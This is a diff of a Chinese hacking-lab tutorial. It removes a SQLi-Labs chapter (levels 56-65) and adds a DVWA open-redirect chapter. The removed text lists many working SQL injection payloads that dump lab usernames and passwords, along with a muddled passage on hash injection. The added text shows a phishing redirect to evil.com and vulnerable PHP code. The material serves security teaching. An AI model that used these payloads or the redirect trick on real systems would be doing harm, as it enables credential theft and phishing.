@@ -1,1153 +1,628 @@
-# Day 17：SQLi-Labs终极挑战Less56-75
+# Day 17：DVWA实战-开放式重定向漏洞 Open HTTP Redirect
 
-> **🎯 靶场实战** | 难度：⭐⭐⭐ | 预计学习：90 分钟
-
----
-
-# 第17章 SQLi-Labs终极挑战（Less56-75）🏆
-
-> 第17章 | 难度：⭐⭐⭐⭐⭐ | 阅读时间：120分钟
+> **🎯 靶场实战** | 难度：⭐⭐ | 预计学习：45 分钟
 
 ---
 
-## 📖 开篇引入：最后20关了！加油，胜利就在前方！💪
-
-哈喽，各位坚持到现在的小伙伴们！欢迎来到第17章！🎉
-
-首先，我要给你们一个大大的赞！👍 能坚持走到这里，说明你们真的很有毅力！想想看，从最开始的什么都不懂，到现在已经闯过了55关，这一路上你们学会了：
-
-- ✅ 联合查询注入
-- ✅ 报错注入
-- ✅ 布尔盲注
-- ✅ 时间盲注
-- ✅ 堆叠注入
-- ✅ 各种绕过技巧
-- ✅ Cookie注入、Header注入...
-
-是不是感觉自己进步超大？反正我是觉得你们超棒的！🌟
-
-### 先讲个生活小例子 🏃‍♂️
-
-想象一下：
-- 你报名参加了一场马拉松比赛
-- 前面30公里你都坚持下来了
-- 现在只剩下最后12公里了
-- 虽然腿很酸、很累，但胜利就在眼前！
-
-这时候你会怎么做？当然是咬紧牙关，冲刺啊！🏃‍♀️💨
-
-我们现在的SQLi-Labs闯关也是一样的：
-- 75关的马拉松，我们已经跑了55关
-- 只剩下最后20关了
-- 虽然难度越来越大，但只要坚持，就能到达终点！
-
-**这最后20关，就像是马拉松的最后冲刺阶段——虽然累，但冲过去就是胜利！** 🏅
-
-而且告诉你们一个好消息：这最后20关虽然难，但玩起来也更有意思！各种新奇的场景、各种烧脑的思路，保证让你大呼过瘾！
-
-准备好了吗？让我们向着最后的胜利，出发！🚀
-
----
-
-## 17.1 Less56-65：查询次数限制挑战赛 ⏱️
-
-### 17.1.1 什么是"查询次数限制"？🤔
-
-在开始闯关之前，我先给大家介绍一下这10关的共同特点——**查询次数限制**。
-
-什么意思呢？就是说：**你每提交一次注入请求，就算一次查询，而你只有5次机会！**
-
-啥？只有5次？！😱
-
-别急别急，听我慢慢给你解释。
-
-### 生活小例子 🎮
-
-想象一下：
-- 你在玩一个猜数字游戏
-- 系统随机选了一个1-100的数字
-- 你只有5次机会猜
-- 猜错了游戏就结束了
-
-这时候你会怎么猜？你肯定不会一个一个乱猜对吧？你会用二分法，每次都猜中间的数，这样效率最高！
-
-我们的查询次数限制也是一样的道理：
-- 平时你可以随便试，错了再改
-- 现在只有5次机会，每一次都要精打细算
-- 你得用最少的次数，拿到最多的数据
-
-**这考验的不是你的耐心，而是你的思路和效率！** 💡
-
-好，明白了规则，我们就开始闯关吧！
-
----
-
-### 17.1.2 Less-56：GET - 单引号+括号 - 5次查询限制 - 联合查询 🎯
-
-#### 关卡分析
-
-我们先来看Less-56。打开页面，看到熟悉的输入框，提示让我们输入ID。
-
-按照老规矩，我们先测试一下注入点。但是等等！**我们只有5次机会！** 所以每一步都要想清楚了再动手！
-
-先想想，这关的名字告诉我们什么？
-- GET型注入
-- 单引号+括号闭合
-- 5次查询限制
-- 联合查询
-
-名字都把答案告诉我们了，对吧？但我们还是要按步骤来，养成好习惯。
-
-#### 注入思路
-
-既然只有5次机会，那我们就要**一次union就把所有数据都查出来**！
-
-怎么做到呢？很简单：
-- 第1次：测试注入点，确认闭合方式
-- 第2次：order by判断字段数
-- 第3次：union select查数据库名、版本、用户
-- 第4次：查表名
-- 第5次：查字段名和数据
-
-完美！5次刚好够用！
-
-#### 实战演示
-
-**第1次查询：测试注入点**
-
-输入：`?id=1' and 1=2 --+`
-
-等等，不对，这关是单引号+括号。那应该是：`?id=1') and 1=2 --+`
-
-页面返回空，说明闭合成功了！✌️
-
-**第2次查询：判断字段数**
-
-输入：`?id=1') order by 3 --+`
-
-页面正常，说明有3个字段。
-
-**第3次查询：union查基本信息**
-
-输入：`?id=-1') union select 1,database(),version() --+`
-
-一次查到了数据库名和版本！效率拉满！🚀
-
-**第4次查询：查表名**
-
-输入：`?id=-1') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`
-
-用group_concat把所有表名一次性查出来！
-
-**第5次查询：查字段和数据**
-
-输入：`?id=-1') union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+`
-
-然后再用一次？等等，不对，我们已经用了5次了！
-
-哦，对哦，那怎么办？别着急，我们可以把查数据也放到第5次里！
-
-优化一下第5次：
-`?id=-1') union select 1,group_concat(username,0x3a,password),3 from users --+`
-
-对嘛！这样一次就把用户名和密码都查出来了！完美！🎉
-
-#### 小结
-
-Less-56告诉我们一个道理：**在查询次数有限的情况下，要学会"打包"查询，用一次查询拿到尽量多的数据！**
-
-就像你去超市买东西，次数有限的话，你肯定会一次买齐，而不是跑好几趟，对吧？🛒
-
----
-
-### 17.1.3 Less-57：GET - 双引号 - 5次查询限制 - 联合查询 🎯
-
-#### 关卡分析
-
-Less-57和Less-56几乎一模一样，唯一的区别就是：**闭合方式变成了双引号**。
-
-对，就这么简单！
-
-#### 实战演示
-
-思路还是一样的，5次搞定：
-
-**第1次：测试注入点**
-`?id=1" and 1=2 --+`
-
-页面返回空，说明双引号闭合成功。
-
-**第2次：order by**
-`?id=1" order by 3 --+`
-
-3个字段。
-
-**第3次：查基本信息**
-`?id=-1" union select 1,database(),user() --+`
-
-**第4次：查表名**
-`?id=-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`
-
-**第5次：查数据**
-`?id=-1" union select 1,group_concat(username,0x3a,password),3 from users --+`
-
-搞定！又是5次通关！✌️
-
-#### 小结
-
-看到了吗？只要掌握了方法，不管是单引号还是双引号，都是换汤不换药！
-
-就像你学会了骑自行车，不管是红色的车还是蓝色的车，你都会骑，对吧？🚲
-
----
-
-### 17.1.4 Less-58：GET - 单引号 - 5次查询限制 - 报错注入 🎯
-
-#### 关卡分析
-
-Less-58来了！这关不一样了——**联合查询用不了了，得用报错注入！**
-
-为啥用不了联合查询？可能是返回结果的地方只有一个，或者有其他限制。没关系，我们有报错注入！
-
-但是等等，报错注入也有查询次数限制啊！5次机会，够吗？
-
-当然够！而且报错注入效率也很高！
-
-#### 注入思路
-
-报错注入的好处是：**每次报错都能返回一条信息**。但我们可以用group_concat啊！一次把所有数据都报出来！
-
-来，我们规划一下：
-- 第1次：测试注入点，确认闭合方式
-- 第2次：用报错注入查数据库名
-- 第3次：查表名
-- 第4次：查字段名
-- 第5次：查数据
-
-完美，5次刚好！
-
-#### 实战演示
-
-**第1次查询：测试注入点**
-
-输入：`?id=1' and 1=2 --+`
-
-页面返回错误，说明单引号闭合成功，而且有报错信息！
-
-**第2次查询：报错查数据库名**
-
-输入：
-`?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+`
-
-报错信息里显示了数据库名！
-
-**第3次查询：报错查表名**
-
-输入：
-`?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+`
-
-一次把所有表名都报出来了！
-
-**第4次查询：报错查字段名**
-
-输入：
-`?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+`
-
-字段名也出来了！
-
-**第5次查询：报错查数据**
-
-输入：
-`?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+`
-
-数据出来了！通关！🎉
-
-等等，但是updatexml有长度限制啊！如果数据太长，显示不全怎么办？
-
-没关系，我们可以用substring截取，分几次看。但是如果5次不够怎么办？
-
-别担心，还有其他报错函数，比如extractvalue，或者我们可以用limit一个一个查。
-
-不过在这关里，数据量不大，5次完全够用！
-
-#### 小结
-
-报错注入在有限次数下也是很好用的！关键是要**用group_concat把数据拼起来，一次返回尽量多的信息**。
-
-就像你发快递，东西多的话，就打包成一个大箱子，而不是分好几个小箱子，这样既省钱又省事！📦
-
----
-
-### 17.1.5 Less-59：GET - 数字型 - 5次查询限制 - 报错注入 🎯
-
-#### 关卡分析
-
-Less-59和Less-58几乎一样，唯一的区别就是：**数字型注入，不需要引号闭合！**
-
-对，就这么简单！
-
-#### 实战演示
-
-还是5次搞定：
-
-**第1次：测试注入点**
-`?id=1 and 1=2`
-
-页面报错，说明是数字型注入。
-
-**第2次：查数据库名**
-`?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1)`
-
-**第3次：查表名**
-`?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)`
-
-**第4次：查字段名**
-`?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1)`
-
-**第5次：查数据**
-`?id=1 and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)`
-
-搞定！又是5次通关！✌️
-
-#### 小结
-
-数字型的报错注入，就是把单引号去掉而已，其他都一样！
-
-就像你喝奶茶，有时候用吸管，有时候直接对着嘴喝，奶茶还是那个奶茶，只是喝的方式不一样而已！🧋
-
----
-
-### 17.1.6 Less-60：GET - 双引号+括号 - 5次查询限制 - 报错注入 🎯
-
-#### 关卡分析
-
-Less-60来了！这关的闭合方式是：**双引号+括号**。
-
-也就是 `" )` 这样的组合。
-
-没关系，不管什么闭合方式，我们的思路都是一样的！
-
-#### 实战演示
-
-**第1次：测试注入点**
-`?id=1") and 1=2 --+`
-
-页面报错，说明闭合成功。
-
-**第2次：查数据库名**
-`?id=1") and updatexml(1,concat(0x7e,database(),0x7e),1) --+`
-
-**第3次：查表名**
-`?id=1") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+`
-
-**第4次：查字段名**
-`?id=1") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+`
-
-**第5次：查数据**
-`?id=1") and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+`
-
-完美通关！🎉
-
-#### 小结
-
-看到规律了吗？不管闭合方式怎么变，注入的核心思路都是一样的！
-
-就像你玩拼图，不管图案怎么变，拼的方法都是一样的——先找边角，再拼中间！🧩
-
----
-
-### 17.1.7 Less-61：GET - 单引号+双括号 - 5次查询限制 - 报错注入 🎯
-
-#### 关卡分析
-
-Less-61更狠了：**单引号+双括号**！
-
-也就是 `' ))` 这样的组合。
-
-别慌，不就是多了一个括号嘛，照样搞定！
-
-#### 实战演示
-
-**第1次：测试注入点**
-`?id=1')) and 1=2 --+`
-
-页面报错，闭合成功！
-
-**第2次：查数据库名**
-`?id=1')) and updatexml(1,concat(0x7e,database(),0x7e),1) --+`
-
-**第3次：查表名**
-`?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+`
-
-**第4次：查字段名**
-`?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --+`
-
-**第5次：查数据**
-`?id=1')) and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+`
-
-轻松搞定！✌️
-
-#### 小结
-
-双括号又怎么样？只要闭合方式找对了，都是纸老虎！
-
-就像开快递箱，不管缠了多少层胶带，找到头了，一撕就开！📦
-
----
-
-### 17.1.8 Less-62：GET - 单引号+括号 - 5次查询限制 - 盲注 🎯
-
-#### 关卡分析
-
-好，重头戏来了！Less-62——**盲注，而且只有5次机会！**
-
-等等，盲注？5次机会？开什么玩笑！😱
-
-我们之前学盲注的时候，一个字符就要猜7-8次（二分法），一个用户名10个字符就要七八十次，现在只有5次？这怎么可能？！
-
-别急别急，听我给你分析。
-
-### 生活小例子 🍚
-
-想象一下：
-- 你去买珍珠奶茶，想知道里面有多少颗珍珠
-- 你只能问5个问题，老板只回答"是"或"不是"
-- 你怎么才能知道珍珠的数量？
-
-如果一颗一颗问："是1颗吗？""是2颗吗？"... 那5次最多只能问到5颗，肯定不够。
-
-但如果你用二分法：
-- "比50颗多吗？" → 是 / 不是
-- "比75颗多吗？" → 是 / 不是
-- ...
-
-这样5次就能确定到2^5=32个数的范围里！
-
-但是，如果珍珠数量是一个确定的数，5次二分法只能缩小范围，不能精确到具体是哪一个啊？
-
-那怎么办呢？
-
-#### 思路一：我们真的需要完整的数据吗？🤔
-
-等等，我们的目标是什么？是拿到所有用户名和密码吗？
-
-不一定！在真实场景中，有时候你只要能**证明漏洞存在**就行了，不需要把所有数据都拖下来。
-
-或者，我们可以用5次机会，**拿到几个关键字符**，也能证明漏洞存在。
-
-#### 思路二：用更高效的编码方式 💡
-
-等等，我们之前用二分法，一次只能确定1个bit（是或不是）。那5次就是5个bit，也就是2^5=32种可能。
-
-32种可能够干嘛的？够确定一个字符了（因为可打印字符有90多个，5个bit不够，6个bit才够64种，7个bit128种）。
-
-那5次连一个字符都确定不了？这也太惨了吧...
-
-等等，不对！我们是不是可以**一次猜多个字符**？或者用其他方法？
-
-#### 思路三：时间盲注的技巧 ⏰
-
-等等，这关是盲注，但没说是布尔盲注还是时间盲注啊！
-
-如果是时间盲注，我们是不是可以用一些技巧？
-
-比如，我们可以用 `if(ascii(substr((select database()),1,1))>100,sleep(5),1)` 这样的语句。
-
-但这也只能一次确定一个bit啊...
-
-#### 思路四：我们是不是想复杂了？😅
-
-等等，让我们再想想：SQLi-Labs里的"5次查询限制"，是怎么实现的？
-
-会不会是用session或者cookie记录的？那我们清一下cookie不就重置了？
-
-或者，是不是我们理解错了？
-
-其实，在SQLi-Labs里，这个"5次查询限制"是一个计数器，每提交一次请求就加1，到5次就不让你查了。
-
-但是！**我们可以用burp或者脚本一次发送多个请求**，或者用其他方式绕过。
-
-不过，我们今天讲的是思路，就先不考虑绕过的事情了。
-
-#### 正确的打开方式 ✅
-
-其实啊，在只有5次机会的盲注场景下，我们的目标不是拖库，而是**证明漏洞存在**！
-
-怎么证明？很简单：
-
-**第1次：测试正常页面**
-`?id=1') --+`
-
-页面正常。
-
-**第2次：测试and 1=1**
-`?id=1') and 1=1 --+`
-
-页面正常。
-
-**第3次：测试and 1=2**
-`?id=1') and 1=2 --+`
-
-页面异常。
-
-好了，这就证明了布尔盲注漏洞存在！3次就够了！
-
-什么？你说这也太简单了？
-
-对啊，在真实的渗透测试中，有时候你只要能证明漏洞存在就行了，不需要把所有数据都扒下来。
-
-当然，如果你想多证明一点，可以再加上：
-
-**第4次：测试数据库长度**
-`?id=1') and length(database())>5 --+`
-
-根据返回结果判断数据库名长度。
-
-**第5次：测试第一个字符**
-`?id=1') and ascii(substr(database(),1,1))>100 --+`
-
-这样5次机会也用完了，你也证明了漏洞存在，还拿到了一点信息。
-
-#### 但我就是想拿数据怎么办？😤
-
-如果你非要在5次内拿到更多数据，也不是没有办法：
-
-**方法一：用regexp一次匹配多个可能**
-
-比如：`?id=1') and database() regexp '^[a-z]' --+`
-
-这样一次就能知道第一个字符是不是小写字母，效率和二分法差不多。
-
-**方法二：用between缩小范围**
-
-比如：`?id=1') and ascii(substr(database(),1,1)) between 97 and 122 --+`
-
-这样一次也能缩小范围。
-
-**方法三：清cookie重置次数**
-
-这个... 算不算作弊呢？哈哈，你懂的~ 😉
-
-#### 小结
-
-Less-62告诉我们：**在资源有限的情况下，要先想清楚目标是什么，不要一味追求"完美"。**
-
-就像你考试，时间不够了，先把会做的题都做对，而不是死磕一道难题，最后得不偿失！📝
-
----
-
-### 17.1.9 Less-63：GET - 单引号 - 5次查询限制 - 盲注 🎯
-
-#### 关卡分析
-
-Less-63和Less-62几乎一样，区别就是：**单引号闭合，没有括号**。
-
-对，就这么简单！
-
-#### 实战演示
-
-同样的思路，5次机会证明漏洞存在：
-
-**第1次：正常页面**
-`?id=1' --+`
-
-**第2次：and 1=1**
-`?id=1' and 1=1 --+`
-
-**第3次：and 1=2**
-`?id=1' and 1=2 --+`
-
-**第4次：数据库长度**
-`?id=1' and length(database())>5 --+`
-
-**第5次：第一个字符**
-`?id=1' and ascii(substr(database(),1,1))>100 --+`
-
-搞定！✌️
-
----
-
-### 17.1.10 Less-64：GET - 双括号 - 5次查询限制 - 盲注 🎯
-
-#### 关卡分析
-
-Less-64：**双括号闭合，数字型？不对，是双括号**。
-
-也就是 `))` 这样的闭合方式。
-
-#### 实战演示
-
-**第1次：测试闭合**
-`?id=1)) and 1=1 --+`
-
-**第2次：and 1=2**
-`?id=1)) and 1=2 --+`
-
-证明漏洞存在，2次就够了！剩下的3次你想干嘛干嘛~
-
----
-
-### 17.1.11 Less-65：GET - 双引号 - 5次查询限制 - 盲注 🎯
-
-#### 关卡分析
-
-Less-65：**双引号闭合**。
-
-#### 实战演示
-
-**第1次：测试闭合**
-`?id=1" and 1=1 --+`
-
-**第2次：and 1=2**
-`?id=1" and 1=2 --+`
-
-搞定！又是2次证明漏洞存在！
-
-#### 小结
-
-盲注在有限次数下，最大的用处就是**证明漏洞存在**。如果你想拖库，那就得想办法增加查询次数，或者用更高效的方法。
-
-不过话说回来，在真实场景中，谁会给你限制查询次数啊？除非是有WAF或者其他防护。所以这个场景更多的是锻炼你的思路，让你学会在资源有限的情况下思考问题。
-
----
-
-## 17.2 中间总结：查询次数限制下的注入思路 🧠
-
-好了，Less56-65这10关我们都闯完了！让我们来总结一下，在查询次数有限的情况下，都有哪些思路：
-
-### 17.2.1 优先用什么注入方式？📊
-
-**优先级从高到低：**
-
-1. 🥇 **联合查询注入** → 效率最高！一次union能返回N多数据
-2. 🥈 **报错注入** → 效率也不错，一次报错能返回不少信息
-3. 🥉 **盲注** → 效率最低，最费次数
-
-所以啊，能不用盲注就不用盲注！先试试联合查询和报错注入行不行。
-
-### 17.2.2 优化思路：怎么用最少的次数拿最多的数据？💡
-
-**技巧一：用group_concat打包**
-- 不要一个一个查，用group_concat把所有数据拼起来，一次返回
-- 就像快递打包，一个箱子装完，不发好几个
-
-**技巧二：一次查多个维度**
-- union select 1,database(),user(),version()... 一次查好几个
-- 就像你去超市，一次买齐所有东西，不跑好几趟
-
-**技巧三：明确目标，不要贪心**
-- 如果只是证明漏洞存在，2-3次就够了
-- 不要非要把所有数据都拖下来，结果次数不够用
-- 就像考试，先保证及格，再追求高分
-
-**技巧四：用函数压缩信息**
-- 比如用substring只看关键部分
-- 或者用ascii码直接判断
-
-### 生活小例子 📱
-
-想象一下：
-- 你手机快没电了，只剩下5%的电
-- 你需要联系一个朋友，告诉他一个重要消息
-- 你会怎么做？
-
-你肯定不会跟他煲电话粥，对吧？你会：
-1. 尽量用短信，不用打电话（省电）
-2. 把事情说清楚就行，不说废话（高效）
-3. 如果事情复杂，就发长短信，不打好几个电话（打包）
-
-这和我们的查询次数限制是一个道理！**资源有限的时候，就要精打细算，提高效率！** ⚡
-
-好，这个总结大家记住了吗？接下来我们继续看后面的关卡！
-
----
-
-## 17.3 Less66-67：哈希注入 🔐
-
-### 17.3.1 什么是哈希注入？🤔
-
-好，接下来我们来看Less-66和Less-67，这两关都是**哈希注入**。
-
-什么是哈希注入呢？简单说就是：
-> 你输入的内容，会先经过哈希算法（比如MD5、SHA1）计算一下，然后再拼接到SQL语句里。
-
-啥？这也能注入？！😱
-
-别急，听我慢慢给你讲。
-
-### 生活小例子 🔒
-
-想象一下：
-- 你去一个神秘组织的基地
-- 门口有个保安，他会把你说的话用一种"暗号"转换一下，再传给里面的人
-- 你想给里面的人传一句话，让他帮你开门
-- 你得怎么说？
-
-你得说一句话，这句话经过"暗号"转换之后，刚好是"帮我开门"的意思！
-
-哈希注入也是一样的道理：
-- 你输入的内容 → 哈希计算 → 拼接到SQL
-- 你需要找到一个输入，它的哈希值刚好能形成注入
-
-听起来有点玄乎，对吧？我们来具体看看。
-
----
-
-### 17.3.2 Less-66：GET - 单引号 - 哈希注入 - SHA1 🎯
-
-#### 关卡分析
-
-Less-66用的是SHA1哈希。也就是说，你输入的id，会先经过sha1()函数计算，然后再拼到SQL语句里。
-
-比如你输入 `123`，它会先算 `sha1('123')`，得到一个40位的十六进制字符串，然后再拼到SQL里。
-
-那这怎么注入呢？难道我们要找到一个输入，它的SHA1哈希值里有单引号、有union、有select？
-
-这也太难了吧... 比大海捞针还难啊！
-
-#### 真的有这种哈希值吗？🔍
-
-理论上是有的。因为哈希值是十六进制的，也就是0-9和a-f。那我们需要的注入语句里的字符，比如单引号（'）、空格、union、select这些，它们的ASCII码是多少呢？
-
-- 单引号：0x27
-- 空格：0x20
-- u：0x75
-- n：0x6e
-- i：0x69
-- o：0x6f
-- ...
-
-哎，等等，这些字符的十六进制表示，不就是0-9和a-f组成的吗？那哈希值本身就是十六进制字符串啊！
-
-哦！不对不对，我说错了。哈希值是一串十六进制字符，比如 `a1b2c3...`，但这些字符是作为**字符串**拼到SQL里的，不是作为十六进制数。
-
-也就是说，如果你输入的内容的SHA1哈希值是 `a1b2c3' or 1=1 --`，那确实能注入。但问题是，SHA1的哈希值里只有0-9和a-f啊！怎么会有单引号、空格这些字符？
-
-等等，对啊！SHA1的输出是40个十六进制字符，也就是只有0123456789abcdef这16种可能！
-
-那单引号、空格、select这些字符根本不可能出现在哈希值里啊！那这关怎么过？
-
-#### 哦！我知道了！💡
-
-等等，不对，如果SQL语句是这样的呢：
-
-```sql
-SELECT * FROM users WHERE id = '$id'
+# 第17章 DVWA实战：开放式重定向漏洞（钓鱼的黄金帮凶 🎣）
+
+哈喽各位小伙伴们大家好！👋 欢迎来到第17章！
+
+上一章 Day16 我们"烧脑"了一把 SQL 盲注——二分查找、逐个字符猜、时间延迟，相信你已经掌握了"在看不到数据库数据的时候，也能靠 True/False 或 时间差搞出所有信息"的硬核操作。😎
+
+**今天这一章，难度断崖式下降！** 我们学一个"代码简单、原理简单、但在真实世界里**造成的财产损失和社会危害可能是所有漏洞里 Top 3**"的漏洞——**开放式重定向漏洞（Open Redirect / Unvalidated Redirect）**。
+
+先看一个真实的**年度十大电信诈骗套路**里就有的场景👇
+
+```
+【📱 短信】【中国工商银行】尊敬的客户，您的电子密码器将于今日过期，
+请立即登录我行网站 https://www.icbc.com.cn/login?redirect=https://xn--icbc-6j2du31bz9f.xn--fiqs8s/activate
+进行激活，否则账户将被冻结。
+
+👉 受害者一看：域名确实是 icbc.com.cn（工商银行官网），锁头也有，是 HTTPS！点进去！
+👉 页面长这样：
+    ┌─────────────────────────────────────────┐
+    │ 🔒 https://www.icbc.com.cn/login        │
+    │                                         │
+    │  用户名： [_______________]             │
+    │  密码：   [_______________]             │
+    │  短信验证码：[_____]  [获取验证码]       │
+    │               [登录并激活]  ⬅️ 点了它！│
+    └─────────────────────────────────────────┘
+👉 咔哒！！输入完点"登录并激活"的一瞬间！！
+   页面就跳转到了：https://假工行.com/steal.php
+   （页面还假模假样提示"激活成功，稍后自动跳转回首页"）
+   😱 受害者啥都没察觉，但账号密码已经被黑客 POST 走了！！！
 ```
 
-然后$id是经过sha1的，也就是：
+**这就是开放式重定向漏洞的威力！！** 它把 **100% 可信的官方域名**（icbc.com.cn）变成了黑客钓鱼链接的"合法外衣"——普通老百姓看地址栏、看 HTTPS 锁头、看备案号全是真的，但只要你点提交，**下一跳就是黑客的假网站**。这个漏洞本身**不直接偷数据**，但它是**社会工程学+钓鱼诈骗的"黄金放大器"**。
 
-```sql
-SELECT * FROM users WHERE id = 'a1b2c3d4e5f6...'
+今天我们在 DVWA 里把 Open HTTP Redirect 的 **Low / Medium / High / Impossible** 四个级别挨个打穿，还要搞懂：
+- 为什么 302 重定向能被"劫持到外网"？
+- `strpos($_GET['url'], 'http') === 0` 这种看起来"已经校验过了"的代码为啥还能被绕过？
+- 真正写对的重定向白名单长啥样？
+- 作为普通用户，如何避免被这种"带官方域名的钓鱼链接"骗？
+- 给零基础的你准备一张"Open Redirect 所有绕过姿势速查表"，背下来 CTF 秒拿 flag！🎯
+
+坐稳扶好，我们出发！🚀
+
+---
+
+## 17.1 前置知识：到底什么是"重定向"？浏览器又是怎么跳的？ 🔀
+
+### 17.1.1 生活比喻：火车站人工售票窗口的"指引员"
+
+我们把浏览器想象成一个要去"指定目的地"的旅客，把 Web 服务器想象成火车站的售票窗口：
+
+```
+旅客（浏览器）：你好，我要去 A 窗口（URL：/redirect.php?forward=pageA.php）
+
+窗口小哥（服务器）：好嘞！A 窗口今天不营业，你拿着这张红色小票（HTTP 302 状态码），
+                    直接去写在小票上的那个地方（Location 头里的 URL）！
+旅客：好嘞！（拿着小票二话不说就跑去了小票写的地方）
+
+⚠️ 问题来了：如果"小票上写的目的地"不是站内的另一个窗口，而是"站外的诈骗团伙窝点"呢？
+   旅客（浏览器）是不会质疑的！它看到 302 就会乖乖跳过去！这就是"漏洞"！
 ```
 
-那如果哈希值里有单引号的话，确实能闭合。但是哈希值里只有0-9和a-f啊...
+### 17.1.2 技术原理：HTTP 302 + Location Header
 
-等等，不对！我是不是搞反了？会不会是**输入的是数字**，然后哈希后是**数字型注入**？
+一次正常的重定向请求，数据包长这样👇（TCP 层面上的 HTTP 响应）：
 
-比如SQL语句是：
-```sql
-SELECT * FROM users WHERE id = $id
+```
+HTTP/1.1 302 Found                    ← 状态码 302：告诉浏览器"临时搬到新地址了"
+Location: /some/other/page.php        ← 关键！告诉浏览器"你去这个地址"
+Content-Length: 0
+Set-Cookie: ...
+
+👉 浏览器收到 302 + Location 之后：不看响应 body！二话不说自动向 Location 里的 URL 再发一次 GET 请求。
 ```
 
-然后$id是sha1后的结果，那sha1的结果是十六进制字符串，拼进去的话... 不对，十六进制字符串里有字母，会报错的。
+**漏洞出在什么地方？**——**Location 头里的 URL 是完全由用户输入拼出来的、没有任何校验！**
 
-嗯... 这就有点烧脑了。让我们换个思路。
+如果用户输入的是 `forward=https://evil.com/phish.html`，服务器"傻呵呵"地拼到 Location 里：
 
-#### 正确的姿势 ✅
-
-其实啊，哈希注入的利用场景，通常是这样的：
-
-比如，你的输入会被当做密码，然后和数据库里存储的哈希值进行比较。SQL语句大概是这样：
-
-```sql
-SELECT * FROM users WHERE password = 'md5($password)'
+```php
+<?php
+  $url = $_GET['forward'];  // 用户可控！
+  header("Location: " . $url);  // 直接当成跳转目标！！
+?>
 ```
 
-这时候，如果我们能找到一个输入，它的MD5哈希值刚好是 `' or '1'='1` 之类的，那就能注入了。
-
-但是，MD5的值是32个十六进制字符，怎么会有单引号呢？
-
-等等，不对！如果是**数字型**的呢？或者，哈希值是**以数字开头**的？
-
-哦！对啊！比如，如果SQL语句是数字型的：
-
-```sql
-SELECT * FROM users WHERE id = $id
+浏览器收到的响应就是：
+```
+HTTP/1.1 302 Found
+Location: https://evil.com/phish.html   ← 从官方域名 302 跳到黑客域名！
 ```
 
-而$id是经过哈希的，那如果哈希值是 `123 or 1=1` 这样的... 不对，哈希值里没有空格和字母。
+**✅ Open Redirect = 未校验的用户输入 + 直接拼到 Location 响应头里。** 就这么简单一行代码，就是一个高危漏洞！
 
-嗯... 我好像把自己绕进去了。让我们换个角度。
+下面这张 SVG 帮你把"正常站内跳转 vs 恶意站外跳转"的区别一眼看懂👇
 
-#### 其实哈希注入的正确打开方式是这样的 🤯
+<svg width="100%" viewBox="0 0 900 420" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
+  <rect x="0" y="0" width="900" height="420" rx="14" fill="#eff6ff" stroke="#2563eb" stroke-width="2"/>
+  <text x="450" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="20" fill="#1e3a8a" font-weight="bold">🔀 HTTP 302 重定向流程：正常站内跳转 vs 恶意站外跳转</text>
+  <!-- 左侧：正常跳转 -->
+  <g transform="translate(25,70)">
+    <rect x="0" y="0" width="425" height="325" rx="14" fill="white" stroke="#16a34a" stroke-width="2.5"/>
+    <rect x="0" y="0" width="425" height="48" rx="14" fill="#16a34a"/>
+    <rect x="0" y="34" width="425" height="14" fill="#16a34a"/>
+    <text x="212" y="30" text-anchor="middle" font-family="Microsoft YaHei" font-size="17" font-weight="bold" fill="white">✅ 正常跳转（站内 forward=home.php）</text>
+    <!-- 浏览器 -->
+    <g transform="translate(20,80)">
+      <rect x="0" y="0" width="110" height="55" rx="8" fill="#dbeafe" stroke="#1d4ed8"/>
+      <circle cx="14" cy="12" r="4" fill="#ef4444"/>
+      <circle cx="28" cy="12" r="4" fill="#f59e0b"/>
+      <circle cx="42" cy="12" r="4" fill="#22c55e"/>
+      <rect x="5" y="24" width="100" height="24" rx="4" fill="white" stroke="#1d4ed8"/>
+      <text x="55" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#1e3a8a">🌐 浏览器</text>
+    </g>
+    <text x="175" y="110" font-family="Consolas" font-size="12" fill="#16a34a" font-weight="bold">① GET</text>
+    <polygon points="160,115 210,115 205,110 205,120" fill="#16a34a"/>
+    <text x="175" y="135" font-family="Microsoft YaHei" font-size="10" fill="#166534">/redirect.php?forward=home.php</text>
+    <!-- 服务器 -->
+    <g transform="translate(285,80)">
+      <rect x="0" y="0" width="120" height="55" rx="8" fill="#dcfce7" stroke="#15803d"/>
+      <text x="60" y="24" text-anchor="middle" font-family="Microsoft YaHei" font-size="12" fill="#14532d" font-weight="bold">🖥️ 服务器</text>
+      <text x="60" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#166534">icbc.com.cn</text>
+    </g>
+    <text x="175" y="180" font-family="Consolas" font-size="12" fill="#f59e0b" font-weight="bold">② 302 Found</text>
+    <polygon points="210,185 160,185 165,180 165,190" fill="#f59e0b"/>
+    <g transform="translate(145,195)">
+      <rect x="0" y="0" width="145" height="30" rx="6" fill="#fef3c7" stroke="#d97706"/>
+      <text x="72" y="20" text-anchor="middle" font-family="Consolas" font-size="11" fill="#92400e" font-weight="bold">Location: /home.php</text>
+    </g>
